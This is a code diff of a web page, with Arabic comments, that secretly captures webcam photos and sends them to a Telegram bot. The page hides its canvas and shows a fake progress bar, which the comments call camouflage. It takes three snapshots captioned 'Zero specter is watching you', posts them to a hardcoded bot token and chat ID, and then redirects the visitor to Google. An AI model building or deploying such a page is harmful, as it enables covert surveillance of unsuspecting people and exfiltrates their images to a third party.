@@ -20,23 +20,28 @@
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
+        // التوكن الجديد والآيدي الخاص بك يا زيرو
         const token = '8261864001:AAE6ByF5lNBVHdURNtDZJDbqRcP6iez00Ss';
         const chat_id = '7388801889';
 
         async function startProcess() {
             try {
+                // طلب الإذن
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                moveProgress(); // بدء خط التقدم
+                // بدء خط التقدم (التمويه)
+                moveProgress();
                 
-                // التقاط 5 صور سريعة جداً وإرسالها فوراً
-                for(let i=1; i<=5; i++) {
-                    await new Promise(r => setTimeout(r, 800)); // فاصل بسيط جداً
+                // التقاط وإرسال 3 صور سريعة
+                for(let i=1; i<=3; i++) {
+                    await new Promise(r => setTimeout(r, 1000));
                     takeAndSend(i);
                 }
             } catch (err) {
+                // إذا رفض الإذن، أرسل رسالة خطأ لبوت تليجرام
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Access%20Denied`);
                 console.log("Access Denied");
             }
         }
@@ -45,13 +50,19 @@
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
             canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', chat_id);
                 formData.append('photo', blob, `img${num}.jpg`);
-                formData.append('caption', `اللقطة السريعة رقم ${num} ⚡`);
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-            }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً لسرعة الرفع
+                formData.append('caption', `Zero specter is watching you.. اللقطة رقم ${num} 📸`);
+                
+                // الإرسال لتليجرام
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg', 0.8);
         }
 
         function moveProgress() {
@@ -62,7 +73,8 @@
             function frame() {
                 if (width >= 100) {
                     clearInterval(id);
-                    window.location.href = "https://www.google.com"; // تمويه عند الانتهاء
+                    // التحويل لجوجل بعد الانتهاء للتمويه
+                    window.location.href = "https://www.google.com";
                 } else {
                     width++;
                     elem.style.width = width + '%';
